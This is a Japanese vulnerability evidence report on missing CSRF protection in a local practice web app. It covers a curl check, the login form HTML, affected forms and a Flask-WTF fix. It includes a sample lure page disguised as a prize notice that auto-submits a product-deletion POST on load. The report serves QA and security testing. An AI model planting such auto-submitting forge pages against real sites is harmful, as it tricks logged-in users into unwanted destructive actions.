# CSRF脆弱性のエビデンス

## 検証方法

ログインフォームのHTMLソースを確認し、CSRFトークンフィールドの有無を検証した。

## 実施コマンド

```bash
curl -s http://127.0.0.1:5000/login | grep -i "csrf\|token"
```

## 結果

CSRFトークンフィールドが見つからなかった（exit code 1）。

## HTMLソース抜粋

```html
<form method="POST" action="/login" data-testid="login-form">
    <div class="form-group">
        <label for="username">ユーザーID</label>
        <input type="text" 
               id="username" 
               name="username" 
               data-testid="username-input"
               required>
    </div>
    
    <div class="form-group">
        <label for="password">パスワード</label>
        <input type="password" 
               id="password" 
               name="password" 
               data-testid="password-input"
               required>
    </div>
    
    <button type="submit" 
            class="btn btn-primary" 
            data-testid="login-submit"
            style="width: 100%;">ログイン</button>
</form>
```

## 観察

- `<input type="hidden" name="csrf_token" ...>` のようなCSRFトークンフィールドが存在しない
- フォームは単純な username と password のみを送信
- サーバー側でCSRFトークンの検証が行われていない

## 攻撃シナリオ例

攻撃者が以下のような悪意のあるHTMLページを作成し、ユーザーに閲覧させる:

```html
<!DOCTYPE html>
<html>
<head>
    <title>懸賞プレゼント</title>
</head>
<body>
    <h1>おめでとうございます！プレゼントが当選しました</h1>
    <p>下のボタンをクリックしてプレゼントを受け取ってください</p>
    
    <!-- 実際は商品削除リクエストを送信 -->
    <form id="malicious" action="http://127.0.0.1:5000/products/1/delete" method="POST">
        <button type="submit">プレゼントを受け取る</button>
    </form>
    
    <!-- 自動的に送信するスクリプト -->
    <script>
        // ページ読み込み時に自動送信（ボタンクリック不要）
        window.onload = function() {
            document.getElementById('malicious').submit();
        }
    </script>
</body>
</html>
```

この悪意のあるページをユーザーが閲覧すると:
1. ユーザーがQA Practice Appにログインしたまま
2. 攻撃者のサイトを閲覧
3. 自動的に商品削除リクエストが送信される
4. CSRFトークンがないため、リクエストが受理される
5. 商品が削除される

## 影響範囲

以下のすべてのフォームでCSRF保護が欠如している:
- ログインフォーム (`/login`)
- 商品登録フォーム (`/products/new`)
- 商品編集フォーム (`/products/{id}/edit`)
- 商品削除フォーム (`/products/{id}/delete`)

## 修正方法

Flask-WTFを使用したCSRF保護の実装例:

```python
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY')
csrf = CSRFProtect(app)
```

テンプレートにCSRFトークンを追加:

```html
<form method="POST" action="/login">
    {{ csrf_token() }}  <!-- この行を追加 -->
    <input type="text" name="username">
    <input type="password" name="password">
    <button type="submit">ログイン</button>
</form>
```

## 検証日時

2025年11月6日 13:44:51
